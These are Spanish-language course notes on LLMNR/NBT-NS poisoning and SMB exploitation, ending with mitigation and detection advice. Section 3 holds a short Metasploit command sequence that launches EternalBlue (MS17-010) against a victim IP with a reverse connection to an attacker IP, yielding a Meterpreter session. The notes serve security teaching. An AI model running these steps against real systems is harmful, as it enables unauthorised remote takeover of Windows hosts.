# Tema 1: Resolución de Nombres de Windows y Explotación de SMB

Este documento combina la información del curso sobre ataques de resolución de nombres (LLMNR/NBT-NS) y la explotación directa de vulnerabilidades en el protocolo SMB.

---

## 1. Fundamentos de la Resolución de Nombres en Windows

La resolución de nombres es el proceso de convertir un nombre de host en una dirección IP. Windows utiliza varios métodos:

1.  **DNS (Domain Name System):** El método principal y más seguro.
2.  **LLMNR (Link-Local Multicast Name Resolution):** Un protocolo de respaldo basado en el formato DNS que opera en la red local (enlace local).
3.  **NetBIOS (Network Basic Input/Output System):** Un protocolo heredado para la resolución de nombres en redes locales.

Cuando el DNS falla, los clientes de Windows recurren a LLMNR y NetBIOS, abriendo la puerta a ataques de envenenamiento.

### Servicios y Puertos Clave de NetBIOS y SMB

| Puerto      | Protocolo | Servicio                                                               |
| :---------- | :-------- | :--------------------------------------------------------------------- |
| TCP 135     | TCP       | Microsoft RPC (MS-RPC), usado para comunicación cliente-servidor.      |
| **UDP 137** | **UDP**   | **Servicio de Nombres NetBIOS (NetBIOS-NS)** para registro y resolución. |
| UDP 138     | UDP       | Servicio de Datagramas NetBIOS (NetBIOS-DGM) para comunicación sin conexión. |
| TCP 139     | TCP       | Servicio de Sesión NetBIOS (NetBIOS-SSN) para comunicación orientada a conexión. |
| **TCP 445** | **TCP**   | **SMB (Server Message Block)**, para compartición de archivos y recursos. |

---

## 2. Ataque de Envenenamiento de LLMNR y NBT-NS

Esta es una de las vulnerabilidades más comunes en redes internas.

### Flujo del Ataque

1.  **Fallo de DNS:** Un cliente intenta acceder a un recurso (ej: `\SERVIDOR_INEXISTENTE`) y el servidor DNS no puede resolverlo.
2.  **Consulta Multicast/Broadcast:** El cliente envía una consulta LLMNR (puerto UDP 5355) o NBT-NS (puerto UDP 137) a toda la red local preguntando por el recurso.
3.  **Envenenamiento:** Un atacante en la misma red responde a la consulta antes que nadie, afirmando ser el recurso solicitado.
4.  **Captura de Credenciales:** El cliente víctima intenta autenticarse contra la máquina del atacante. En este proceso, envía el **nombre de usuario y el hash NTLMv2** de la contraseña.
5.  **Uso del Hash:** El atacante, una vez con el hash, puede:
    *   **Crackearlo Offline:** Usar herramientas de fuerza bruta (`Hashcat`, `John the Ripper`) para obtener la contraseña en texto plano.
    *   **Retransmitirlo (Pass-the-Hash / SMB Relay):** Usar el hash directamente para autenticarse en otros sistemas como si fuera el usuario víctima.

### Herramientas de Ataque

*   **Responder:** La herramienta por excelencia para automatizar el envenenamiento de LLMNR/NBT-NS y la captura de hashes.
*   **NBNSpoof:** Una herramienta más antigua para realizar envenenamiento de NBT-NS.
*   **Metasploit Framework:** Contiene módulos para realizar estos ataques.
*   **Pupy:** Herramienta de administración remota (RAT) que incluye estas capacidades.

---

## 3. Explotación Directa de SMB

SMB ha sido históricamente uno de los protocolos con más vulnerabilidades críticas. La base de datos de `exploit-db` contiene docenas de ellas, como se puede verificar con el comando `searchsploit smb`.

### Caso de Estudio: EternalBlue (MS17-010)

*   **Origen:** Una de las explotaciones más famosas, filtrada por el grupo "Shadow Brokers" y atribuida a la NSA.
*   **Vulnerabilidad:** Permite la **ejecución de código remoto (RCE)** sin autenticación en sistemas Windows que utilizan una versión vulnerable del protocolo SMBv1.
*   **Impacto:** Fue la base para ataques de ransomware masivos como **WannaCry** y **Nyeta (NotPetya)**.

### Ejemplo de Explotación con Metasploit

El siguiente es un resumen del proceso para usar EternalBlue en Metasploit:

```bash
# Iniciar Metasploit
msfconsole

# 1. Seleccionar el módulo de la explotación
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# 2. Ver las opciones requeridas
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

# 3. Configurar los parámetros obligatorios
# RHOSTS: La(s) IP(s) de la(s) víctima(s)
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.1.1.2

# LHOST: Nuestra IP, para recibir la conexión inversa
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.66.6

# 4. Lanzar el ataque
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

# Si tiene éxito, se obtiene una sesión de Meterpreter para controlar el sistema.
```

---

## 4. Enumeración y Reconocimiento

Antes de atacar, es crucial identificar sistemas vulnerables. La enumeración permite descubrir información valiosa.

*   **Nmap:** Puede usarse con scripts (NSE) para detectar versiones de SMB, sistemas operativos y vulnerabilidades como MS17-010.
*   **Enum4linux:** Una herramienta específica para enumerar información de sistemas Windows a través de SMB, como listas de usuarios, recursos compartidos, etc.

---

## 5. Mitigación y Detección

### Mitigación

1.  **Deshabilitar LLMNR y NetBIOS:** Es la medida más efectiva contra el envenenamiento. Se puede realizar mediante GPO (Group Policy Object) en un entorno de dominio.
2.  **Exigir Firma de SMB (SMB Signing):** Previene los ataques de retransmisión (SMB Relay) al verificar la integridad y autenticidad de los paquetes SMB.
3.  **Deshabilitar SMBv1:** Un protocolo obsoleto y extremadamente inseguro, principal culpable de la propagación de EternalBlue.
4.  **Segmentación de Red:** Limita el alcance de las consultas broadcast/multicast y aísla sistemas críticos.

### Detección

*   Se puede monitorear la clave de registro `HKLM\Software\Policies\Microsoft\Windows NT\DNSClient` para detectar cambios en el valor DWORD de `EnableMulticast`. Si el valor es `0`, LLMNR está deshabilitado. Cambios inesperados a `1` podrían indicar una actividad maliciosa.